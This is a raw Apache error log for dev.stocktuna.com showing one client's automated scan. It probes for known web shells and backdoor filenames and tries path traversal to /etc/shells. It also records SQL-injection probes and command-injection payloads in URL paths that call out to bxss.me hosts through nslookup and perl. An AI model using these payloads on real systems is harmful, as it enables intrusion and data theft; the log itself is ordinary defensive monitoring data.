[Wed Jul 07 19:02:20.129170 2021] [php7:error] [pid 13801] [client 27.147.202.214:14110] script '/var/www/html/dev.stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 19:02:20.292096 2021] [php7:error] [pid 13798] [client 27.147.202.214:14101] script '/var/www/html/dev.stocktuna.com/assets/apc.php' not found or unable to stat
[Wed Jul 07 19:02:20.306302 2021] [php7:error] [pid 13759] [client 27.147.202.214:14093] script '/var/www/html/dev.stocktuna.com/assets/css/nstview.php' not found or unable to stat
[Wed Jul 07 19:02:20.345083 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/css/info.php' not found or unable to stat
[Wed Jul 07 19:02:20.590957 2021] [authz_core:error] [pid 13798] [client 27.147.202.214:14101] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/assets/.htaccess
[Wed Jul 07 19:02:20.596765 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/css/nst.php' not found or unable to stat
[Wed Jul 07 19:02:20.732148 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 19:02:20.884862 2021] [php7:error] [pid 13750] [client 27.147.202.214:14095] script '/var/www/html/dev.stocktuna.com/assets/css/rst.php' not found or unable to stat
[Wed Jul 07 19:02:21.026932 2021] [php7:error] [pid 13806] [client 27.147.202.214:14114] script '/var/www/html/dev.stocktuna.com/assets/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:02:21.202132 2021] [php7:error] [pid 13798] [client 27.147.202.214:14101] script '/var/www/html/dev.stocktuna.com/assets/css/r57eng.php' not found or unable to stat
[Wed Jul 07 19:02:21.316972 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 19:02:21.532052 2021] [php7:error] [pid 13798] [client 27.147.202.214:14101] script '/var/www/html/dev.stocktuna.com/assets/css/shell.php' not found or unable to stat
[Wed Jul 07 19:02:21.538550 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/assets/webadmin.php' not found or unable to stat
[Wed Jul 07 19:02:21.677409 2021] [php7:error] [pid 13806] [client 27.147.202.214:14114] script '/var/www/html/dev.stocktuna.com/assets/pi.php' not found or unable to stat
[Wed Jul 07 19:02:21.817984 2021] [php7:error] [pid 13796] [client 27.147.202.214:14103] script '/var/www/html/dev.stocktuna.com/assets/css/dra.php' not found or unable to stat
[Wed Jul 07 19:02:21.953756 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Wed Jul 07 19:02:21.989135 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/assets/r57shell.php' not found or unable to stat
[Wed Jul 07 19:02:22.105486 2021] [php7:error] [pid 13796] [client 27.147.202.214:14103] script '/var/www/html/dev.stocktuna.com/assets/css/r.php' not found or unable to stat
[Wed Jul 07 19:02:22.261584 2021] [php7:error] [pid 13806] [client 27.147.202.214:14114] script '/var/www/html/dev.stocktuna.com/assets/php.php' not found or unable to stat
[Wed Jul 07 19:02:22.271439 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/assets/r57.php' not found or unable to stat
[Wed Jul 07 19:02:22.392628 2021] [php7:error] [pid 13796] [client 27.147.202.214:14103] script '/var/www/html/dev.stocktuna.com/assets/css/lol.php' not found or unable to stat
[Wed Jul 07 19:02:22.542645 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 19:02:22.551547 2021] [php7:error] [pid 13806] [client 27.147.202.214:14114] script '/var/www/html/dev.stocktuna.com/assets/i.php' not found or unable to stat
[Wed Jul 07 19:02:22.555620 2021] [php7:error] [pid 13759] [client 27.147.202.214:14093] script '/var/www/html/dev.stocktuna.com/assets/r58.php' not found or unable to stat
[Wed Jul 07 19:02:22.679562 2021] [php7:error] [pid 13796] [client 27.147.202.214:14103] script '/var/www/html/dev.stocktuna.com/assets/css/zehir.php' not found or unable to stat
[Wed Jul 07 19:02:23.002867 2021] [php7:error] [pid 13796] [client 27.147.202.214:14103] script '/var/www/html/dev.stocktuna.com/assets/css/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:02:23.315314 2021] [php7:error] [pid 13761] [client 27.147.202.214:14104] script '/var/www/html/dev.stocktuna.com/assets/css/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:02:23.377724 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 19:02:23.404927 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/c99shell.php' not found or unable to stat
[Wed Jul 07 19:02:23.406013 2021] [php7:error] [pid 13806] [client 27.147.202.214:14114] script '/var/www/html/dev.stocktuna.com/assets/test.php' not found or unable to stat
[Wed Jul 07 19:02:23.536164 2021] [core:error] [pid 13807] [client 27.147.202.214:14115] AH00126: Invalid URI in request GET /images/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:02:23.618487 2021] [php7:error] [pid 13761] [client 27.147.202.214:14104] script '/var/www/html/dev.stocktuna.com/assets/css/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:02:23.734837 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/c99.php' not found or unable to stat
[Wed Jul 07 19:02:24.019006 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 19:02:24.057221 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/nstview.php' not found or unable to stat
[Wed Jul 07 19:02:24.368900 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/nst.php' not found or unable to stat
[Wed Jul 07 19:02:24.642072 2021] [php7:error] [pid 13750] [client 27.147.202.214:14095] script '/var/www/html/dev.stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Wed Jul 07 19:02:24.659727 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/rst.php' not found or unable to stat
[Wed Jul 07 19:02:24.948707 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/r57eng.php' not found or unable to stat
[Wed Jul 07 19:02:25.196302 2021] [php7:error] [pid 13822] [client 27.147.202.214:12161] script '/var/www/html/dev.stocktuna.com/images/6o9oa7z4zsqy.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:25.238838 2021] [php7:error] [pid 13763] [client 27.147.202.214:14097] script '/var/www/html/dev.stocktuna.com/assets/shell.php' not found or unable to stat
[Wed Jul 07 19:02:25.263379 2021] [php7:error] [pid 13806] [client 27.147.202.214:14114] script '/var/www/html/dev.stocktuna.com/assets/temp.php' not found or unable to stat
[Wed Jul 07 19:02:25.525379 2021] [php7:error] [pid 13796] [client 27.147.202.214:14103] script '/var/www/html/dev.stocktuna.com/assets/dra.php' not found or unable to stat
[Wed Jul 07 19:02:25.554290 2021] [php7:error] [pid 13709] [client 27.147.202.214:12177] script '/var/www/html/dev.stocktuna.com/assets/info.php' not found or unable to stat
[Wed Jul 07 19:02:25.853582 2021] [php7:error] [pid 13707] [client 27.147.202.214:14105] script '/var/www/html/dev.stocktuna.com/assets/r.php' not found or unable to stat
[Wed Jul 07 19:02:26.700185 2021] [php7:error] [pid 13754] [client 27.147.202.214:12173] script '/var/www/html/dev.stocktuna.com/assets/lol.php' not found or unable to stat
[Wed Jul 07 19:02:27.019390 2021] [php7:error] [pid 13754] [client 27.147.202.214:12173] script '/var/www/html/dev.stocktuna.com/assets/zehir.php' not found or unable to stat
[Wed Jul 07 19:02:28.017129 2021] [php7:error] [pid 13754] [client 27.147.202.214:12173] script '/var/www/html/dev.stocktuna.com/assets/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:02:28.342138 2021] [php7:error] [pid 13754] [client 27.147.202.214:12173] script '/var/www/html/dev.stocktuna.com/assets/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:02:28.662566 2021] [php7:error] [pid 13818] [client 27.147.202.214:12175] script '/var/www/html/dev.stocktuna.com/assets/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:02:31.641846 2021] [authz_core:error] [pid 13818] [client 27.147.202.214:12175] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/assets/js/.htaccess~
[Wed Jul 07 19:02:31.980772 2021] [authz_core:error] [pid 13818] [client 27.147.202.214:12175] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/assets/js/.htaccess.old
[Wed Jul 07 19:02:32.318282 2021] [authz_core:error] [pid 13818] [client 27.147.202.214:12175] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/assets/js/.htaccess.save
[Wed Jul 07 19:02:33.397699 2021] [core:error] [pid 13801] (36)File name too long: [client 27.147.202.214:14110] AH00036: access to /;(nslookup hitolgnbbjiky30cda.bxss.me||perl -e "gethostbyname('hitolgnbbjiky30cda.bxss.me')")|(nslookup hitolgnbbjiky30cda.bxss.me||perl -e "gethostbyname('hitolgnbbjiky30cda.bxss.me')")&(nslookup hitolgnbbjiky30cda.bxss.me||perl -e "gethostbyname('hitolgnbbjiky30cda.bxss.me')")/js/browser.min.js failed (filesystem path '/var/www/html/dev.stocktuna.com/;(nslookup hitolgnbbjiky30cda.bxss.me||perl -e "gethostbyname('hitolgnbbjiky30cda.bxss.me')")|(nslookup hitolgnbbjiky30cda.bxss.me||perl -e "gethostbyname('hitolgnbbjiky30cda.bxss.me')")&(nslookup hitolgnbbjiky30cda.bxss.me||perl -e "gethostbyname('hitolgnbbjiky30cda.bxss.me')")')
[Wed Jul 07 19:02:34.212880 2021] [core:error] [pid 13803] (36)File name too long: [client 27.147.202.214:14112] AH00036: access to /;(nslookup hitwobrrcndzv07460.bxss.me||perl -e "gethostbyname('hitwobrrcndzv07460.bxss.me')")|(nslookup hitwobrrcndzv07460.bxss.me||perl -e "gethostbyname('hitwobrrcndzv07460.bxss.me')")&(nslookup hitwobrrcndzv07460.bxss.me||perl -e "gethostbyname('hitwobrrcndzv07460.bxss.me')")/js/breakpoints.min.js failed (filesystem path '/var/www/html/dev.stocktuna.com/;(nslookup hitwobrrcndzv07460.bxss.me||perl -e "gethostbyname('hitwobrrcndzv07460.bxss.me')")|(nslookup hitwobrrcndzv07460.bxss.me||perl -e "gethostbyname('hitwobrrcndzv07460.bxss.me')")&(nslookup hitwobrrcndzv07460.bxss.me||perl -e "gethostbyname('hitwobrrcndzv07460.bxss.me')")')
[Wed Jul 07 19:02:35.733127 2021] [php7:error] [pid 13754] [client 27.147.202.214:12173] script '/var/www/html/dev.stocktuna.com/images/apc.php' not found or unable to stat
[Wed Jul 07 19:02:36.448395 2021] [authz_core:error] [pid 13803] [client 27.147.202.214:14112] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/images/.htaccess
[Wed Jul 07 19:02:37.310426 2021] [php7:error] [pid 13706] [client 27.147.202.214:12176] script '/var/www/html/dev.stocktuna.com/2PYG5uxs.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:37.572190 2021] [php7:error] [pid 13709] [client 27.147.202.214:12177] script '/var/www/html/dev.stocktuna.com/docsxzYJw.php' not found or unable to stat
[Wed Jul 07 19:02:37.628432 2021] [authz_core:error] [pid 13754] [client 27.147.202.214:12173] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/assets/css/.htaccess~
[Wed Jul 07 19:02:37.661569 2021] [php7:error] [pid 13818] [client 27.147.202.214:12175] script '/var/www/html/dev.stocktuna.com/images/webadmin.php' not found or unable to stat
[Wed Jul 07 19:02:37.672370 2021] [php7:error] [pid 13808] [client 27.147.202.214:14118] script '/var/www/html/dev.stocktuna.com/images/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:02:37.975935 2021] [authz_core:error] [pid 13804] [client 27.147.202.214:14113] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/assets/css/.htaccess.old
[Wed Jul 07 19:02:38.209816 2021] [php7:error] [pid 13798] [client 27.147.202.214:14101] script '/var/www/html/dev.stocktuna.com/docs' AND 2*3*8=6*8 AND 'dKVp'='dKVp.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:38.295713 2021] [authz_core:error] [pid 13754] [client 27.147.202.214:12173] AH01630: client denied by server configuration: /var/www/html/dev.stocktuna.com/assets/css/.htaccess.save
[Wed Jul 07 19:02:38.332898 2021] [php7:error] [pid 13818] [client 27.147.202.214:12175] script '/var/www/html/dev.stocktuna.com/images/pi.php' not found or unable to stat
[Wed Jul 07 19:02:38.600149 2021] [core:error] [pid 13763] (36)File name too long: [client 27.147.202.214:14097] AH00036: access to /assets/;(nslookup hitgdjyjbjqrh086c9.bxss.me||perl -e "gethostbyname('hitgdjyjbjqrh086c9.bxss.me')")|(nslookup hitgdjyjbjqrh086c9.bxss.me||perl -e "gethostbyname('hitgdjyjbjqrh086c9.bxss.me')")&(nslookup hitgdjyjbjqrh086c9.bxss.me||perl -e "gethostbyname('hitgdjyjbjqrh086c9.bxss.me')")/browser.min.js failed (filesystem path '/var/www/html/dev.stocktuna.com/assets/;(nslookup hitgdjyjbjqrh086c9.bxss.me||perl -e "gethostbyname('hitgdjyjbjqrh086c9.bxss.me')")|(nslookup hitgdjyjbjqrh086c9.bxss.me||perl -e "gethostbyname('hitgdjyjbjqrh086c9.bxss.me')")&(nslookup hitgdjyjbjqrh086c9.bxss.me||perl -e "gethostbyname('hitgdjyjbjqrh086c9.bxss.me')")')
[Wed Jul 07 19:02:38.773116 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/images/r57shell.php' not found or unable to stat
[Wed Jul 07 19:02:39.092837 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/images/r57.php' not found or unable to stat
[Wed Jul 07 19:02:39.123756 2021] [php7:error] [pid 13808] [client 27.147.202.214:14118] script '/var/www/html/dev.stocktuna.com/docs" AND 2*3*8=6*8 AND "Ki9M"="Ki9M.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:39.302236 2021] [core:error] [pid 13732] (36)File name too long: [client 27.147.202.214:14098] AH00036: access to /;(nslookup hitidvrvdeekh1b557.bxss.me||perl -e "gethostbyname('hitidvrvdeekh1b557.bxss.me')")|(nslookup hitidvrvdeekh1b557.bxss.me||perl -e "gethostbyname('hitidvrvdeekh1b557.bxss.me')")&(nslookup hitidvrvdeekh1b557.bxss.me||perl -e "gethostbyname('hitidvrvdeekh1b557.bxss.me')")/js/jquery.min.js failed (filesystem path '/var/www/html/dev.stocktuna.com/;(nslookup hitidvrvdeekh1b557.bxss.me||perl -e "gethostbyname('hitidvrvdeekh1b557.bxss.me')")|(nslookup hitidvrvdeekh1b557.bxss.me||perl -e "gethostbyname('hitidvrvdeekh1b557.bxss.me')")&(nslookup hitidvrvdeekh1b557.bxss.me||perl -e "gethostbyname('hitidvrvdeekh1b557.bxss.me')")')
[Wed Jul 07 19:02:39.406273 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/images/r58.php' not found or unable to stat
[Wed Jul 07 19:02:39.728636 2021] [php7:error] [pid 13802] [client 27.147.202.214:14109] script '/var/www/html/dev.stocktuna.com/images/c99shell.php' not found or unable to stat
[Wed Jul 07 19:02:40.019532 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/docs%' AND 2*3*8=6*8 AND 'sPXW'!='sPXW%.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:40.053433 2021] [php7:error] [pid 13808] [client 27.147.202.214:14118] script '/var/www/html/dev.stocktuna.com/images/c99.php' not found or unable to stat
[Wed Jul 07 19:02:40.953372 2021] [php7:error] [pid 13808] [client 27.147.202.214:14118] script '/var/www/html/dev.stocktuna.com/images/nstview.php' not found or unable to stat
[Wed Jul 07 19:02:41.160410 2021] [core:error] [pid 13809] (36)File name too long: [client 27.147.202.214:14123] AH00036: access to /assets/;(nslookup hitmpdvhxnbpja469a.bxss.me||perl -e "gethostbyname('hitmpdvhxnbpja469a.bxss.me')")|(nslookup hitmpdvhxnbpja469a.bxss.me||perl -e "gethostbyname('hitmpdvhxnbpja469a.bxss.me')")&(nslookup hitmpdvhxnbpja469a.bxss.me||perl -e "gethostbyname('hitmpdvhxnbpja469a.bxss.me')")/breakpoints.min.js failed (filesystem path '/var/www/html/dev.stocktuna.com/assets/;(nslookup hitmpdvhxnbpja469a.bxss.me||perl -e "gethostbyname('hitmpdvhxnbpja469a.bxss.me')")|(nslookup hitmpdvhxnbpja469a.bxss.me||perl -e "gethostbyname('hitmpdvhxnbpja469a.bxss.me')")&(nslookup hitmpdvhxnbpja469a.bxss.me||perl -e "gethostbyname('hitmpdvhxnbpja469a.bxss.me')")')
[Wed Jul 07 19:02:41.183604 2021] [php7:error] [pid 13818] [client 27.147.202.214:12175] script '/var/www/html/dev.stocktuna.com/images/php.php' not found or unable to stat
[Wed Jul 07 19:02:41.284129 2021] [php7:error] [pid 13808] [client 27.147.202.214:14118] script '/var/www/html/dev.stocktuna.com/images/nst.php' not found or unable to stat
[Wed Jul 07 19:02:41.481694 2021] [php7:error] [pid 13809] [client 27.147.202.214:14123] script '/var/www/html/dev.stocktuna.com/-1 OR 2+852-852-1=0+0+0+1.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:41.515787 2021] [php7:error] [pid 13818] [client 27.147.202.214:12175] script '/var/www/html/dev.stocktuna.com/images/i.php' not found or unable to stat
[Wed Jul 07 19:02:41.617798 2021] [php7:error] [pid 13808] [client 27.147.202.214:14118] script '/var/www/html/dev.stocktuna.com/images/rst.php' not found or unable to stat
[Wed Jul 07 19:02:41.813867 2021] [php7:error] [pid 13801] [client 27.147.202.214:14110] script '/var/www/html/dev.stocktuna.com/-1 OR 3+852-852-1=0+0+0+1.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:42.134094 2021] [php7:error] [pid 13801] [client 27.147.202.214:14110] script '/var/www/html/dev.stocktuna.com/docs'||'.php' not found or unable to stat, referer: https://dev.stocktuna.com/
[Wed Jul 07 19:02:42.393187 2021] [php7:error] [pid 13818] [client 27.147.202.214:12175] script '/var/www/html/dev.stocktuna.com/images/test.php' not found or unable to stat
[Wed Jul 07 19:02:42.421174 2021] [php7:error] [pid 13803] [client 27.147.202.214:14112] script '/var/www/html/dev.stocktuna.com/IekOZdocs.php' not found or unable to stat
[Wed Jul 07 19:02:42.520671 2021] [php7:error] [pid 13808] [client 27.147.202.214:14118] script '/var/www/html/dev.stocktuna.com/images/r57eng.php' not found or unable to stat
[Wed Jul 07 19:02:42.729751 2021] [php7:error] [pid 13818] [client 27.147.202.214:12175] script '/var/www/html/dev.stocktuna.com/images/temp.php' not found or unable to stat
[Wed Jul 07 19:02:42.848813 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/images/shell.php' not found or unable to stat
[Wed Jul 07 19:02:43.064398 2021] [php7:error] [pid 13818] [client 27.147.202.214:12175] script '/var/www/html/dev.stocktuna.com/images/info.php' not found or unable to stat
[Wed Jul 07 19:02:43.165657 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/images/dra.php' not found or unable to stat
[Wed Jul 07 19:02:43.483605 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/images/r.php' not found or unable to stat
[Wed Jul 07 19:02:43.801218 2021] [php7:error] [pid 13811] [client 27.147.202.214:14122] script '/var/www/html/dev.stocktuna.com/images/lol.php' not found or unable to stat
